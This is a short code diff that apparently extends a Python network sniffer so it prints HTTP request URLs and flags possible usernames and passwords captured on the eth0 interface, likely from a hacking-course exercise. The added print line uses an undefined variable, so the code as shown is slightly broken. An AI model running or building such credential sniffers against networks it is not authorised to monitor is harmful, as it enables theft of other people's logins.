@@ -28,5 +28,9 @@ def process_sniffed_packet():
         url = get_url(packet)
         print("[+] HTTP Request >> " + url)
 
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >> " + load + "\n\n")
+                   
 #sniff interface (hardcoded)
 sniff("eth0")
